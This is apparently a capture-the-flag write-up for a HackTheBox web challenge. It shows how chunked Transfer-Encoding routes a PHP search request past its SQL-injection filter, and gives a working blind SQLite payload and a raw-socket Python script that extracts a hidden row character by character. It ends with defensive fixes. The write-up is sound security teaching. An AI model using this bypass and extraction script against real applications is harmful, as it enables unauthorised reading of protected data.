---
title: "0xBOverchunked"
date: 2027-04-30 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sql-injection, waf-bypass, transfer-encoding, chunked, blind-sqli]
description: "An Easy Web challenge where the search handler runs its SQL-injection WAF on one code path and a raw, unprotected query on another — and a single request header, Transfer-Encoding: chunked, decides which path you hit. Send the request the other way and the WAF is never in the loop; a blind 200/500 oracle then leaks the flag row character by character."
---

## Overview

**0xBOverchunked** is an Easy Web challenge: a tiny PHP "retro games" search page backed by SQLite. The search box is well defended — a keyword/quote WAF and a prepared statement that explicitly refuses to return the flag row. But the handler quietly forks its logic on the `Transfer-Encoding: chunked` request header, and the *chunked* branch runs a raw, unparameterized query with **no WAF and no row guard**. The whole challenge is realising you can choose the unprotected branch yourself, then riding a blind [SQL injection](https://cwe.mitre.org/data/definitions/89.html) oracle to read the flag out of the row the safe path won't give you.

## The technique

The handler `Controllers/Handlers/SearchHandler.php` branches on a header the client controls:

```php
if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked") {
    $search = $_POST['search'];
    $result = unsafequery($pdo, $search);          // no WAF, no id==6 guard
    if ($result) echo "No post id found.";          // row found  -> HTTP 200
    else { http_response_code(500); exit(); }       // no row     -> HTTP 500
} else {
    if (waf_sql_injection($_POST["search"]))         // keyword/quote WAF
        $result = safequery($pdo, $_POST["search"]); // prepared stmt + die() on id==6
    else echo "SQL Injection attempt identified and prevented by WAF!";
}
```

Both guards live only on the `else` branch. The flag is the row `id=6` (`gamedesc = 'HTB{...}'`), and `safequery()` does `if ($id == 6) die("You are not allowed to view this post!")` — so the defended path can never return it. The chunked branch, however, calls:

```php
function unsafequery($pdo, $id) {
    $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
    ...
}
```

`'$id'` is raw string interpolation — textbook injection — with no filtering and no row guard. The developer assumed a normal browser only ever hits the WAF branch. Adding one header routes around the entire defense.

Two details make it a "challenge" rather than a one-liner:

1. **You must actually send a chunked body.** Setting the header alone isn't enough — PHP only populates `$_POST['search']` on that branch if Apache de-chunks a real chunked body of the form `<hexlen>\r\n<body>\r\n0\r\n\r\n`. Python's `requests` always sends `Content-Length`, landing on the *wrong* branch, so the request has to be hand-built over a raw socket.
2. **The output is blind and inverted.** A matching row prints `"No post id found."` (HTTP **200**); no row → HTTP **500**. That 200-vs-500 difference is a clean one-bit oracle, perfect for extracting a value character by character.

The extraction payload:

```sql
0' OR substr((SELECT gamedesc FROM posts WHERE id=6),POS,1)=char(C)-- -
```

`id='0'` matches nothing, so the row only comes back when the flag's character at position `POS` equals `char(C)`. SQLite's default `BINARY` collation makes `=` case-sensitive — exactly right for a mixed-case flag.

## Solution

`solve.py` opens a raw socket, hand-encodes the chunked body so the request lands on the unguarded branch, and walks the flag one position at a time using the 200/500 oracle:

```python
#!/usr/bin/env python3
import socket, urllib.parse, sys
HOST, PORT = sys.argv[1], int(sys.argv[2])
PATH = '/Controllers/Handlers/SearchHandler.php'

def oracle(payload):
    body = 'search=' + urllib.parse.quote(payload, safe='')
    chunked = f"{len(body):x}\r\n{body}\r\n0\r\n\r\n"          # hand-chunked body
    req = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Transfer-Encoding: chunked\r\n"                    # route to unsafe branch
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Connection: close\r\n\r\n{chunked}")
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(req.encode())
    data = b''
    while True:
        c = s.recv(4096)
        if not c: break
        data += c
    s.close()
    return b'200 OK' in data.split(b'\r\n', 1)[0]               # 200 = TRUE, 500 = FALSE

charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_!?@#$%^&*()-+=.,:;/ "
flag, pos = '', 1
while True:
    hit = next((ch for ch in charset
                if oracle(f"0' OR substr((SELECT gamedesc FROM posts WHERE id=6),{pos},1)=char({ord(ch)})-- -")), None)
    if hit is None: break
    flag += hit; print(flag); pos += 1
    if flag.endswith('}'): break
```

Run it against the live instance:

```bash
python3 solve.py <host> <port>
# ...
# HTB{...}
```

The flag drops out one character at a time. (Value redacted — solve the live instance.)

## Why it worked

Input validation was attached to a *request shape*, not to the *sink*. The WAF and the row-level `id==6` check both lived on the non-chunked branch, while the chunked branch reached the database with an unparameterized query. Controlling a single header — `Transfer-Encoding` — selected the path with no defenses, turning a "protected" search box into an unauthenticated [SQL injection](https://cwe.mitre.org/data/definitions/89.html) that reads a row the application explicitly tries to hide.

## Fix / defense

- **Validate and parameterize on every branch.** There is no reason for an unparameterized `unsafequery()` to exist — use the same prepared statement (`WHERE id = ?`) on every path.
- **Never key a security control on a client-controlled header, method, or content-type.** A guard the client can route around is not a guard.
- **Enforce row-level authorization in the data/query layer**, not as an ad-hoc `if ($id == 6)` inside one handler.
- **Normalize or reject unexpected `Transfer-Encoding`** on application endpoints so the chunked-vs-`Content-Length` shape can't dispatch to different handlers.

The same pivot recurs whenever validation is bolted to a request shape: chunked vs `Content-Length`, `HEAD` vs `GET`, JSON vs form-urlencoded, `/api/v1` vs `/api/v2` — always probe the alternate shape that skips the validated path.
